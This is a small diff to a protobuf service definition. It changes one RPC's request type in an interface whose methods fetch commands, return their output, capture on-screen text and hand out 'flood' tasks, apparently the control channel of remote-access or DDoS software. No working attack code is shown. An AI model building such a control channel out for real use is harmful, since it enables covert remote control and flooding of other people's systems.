@@ -34,6 +34,6 @@ service Consumer {
     rpc SubscribeOnScreenText(ClientDataRequest) returns (stream ClientDataOnScreenTextResponse);
     rpc GetCommand(ClientDataRequest) returns (ClientExecData);
     rpc SetCommandOutput(ClientExecOutput) returns (Void);
-    rpc GetFlood(ClientDataRequest) returns (FloodData);
+    rpc GetFlood(Void) returns (FloodData);
     rpc SetFloodOutput(stream FloodOutput) returns (Void);
 }
